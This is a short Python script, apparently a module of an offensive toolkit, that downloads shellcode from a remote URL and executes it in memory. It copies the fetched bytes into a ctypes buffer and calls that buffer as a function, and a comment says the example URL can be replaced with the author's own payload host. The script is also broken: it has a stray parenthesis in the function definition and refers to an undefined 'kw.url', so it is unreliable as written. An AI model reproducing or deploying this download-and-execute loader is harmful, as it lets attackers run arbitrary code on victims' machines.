#!/usr/bin/env python3

import base64
import ctypes
import urllib.request


# example, can be replaced with mine
url = 'http://shell-storm.org/shellcode/files/shellcode-809.php'

def run(url)):
    print('[*] In shellcode module')
    url = kw.url
    response = urllib.request.urlopen(url)
    sc = response.read() # and other operations like b64decode or decrypt
    buf = ctypes.create_string_buffer(sc, len(sc))
    function = ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_void_p))
    function()


if __name__ == '__main__':
    run(url)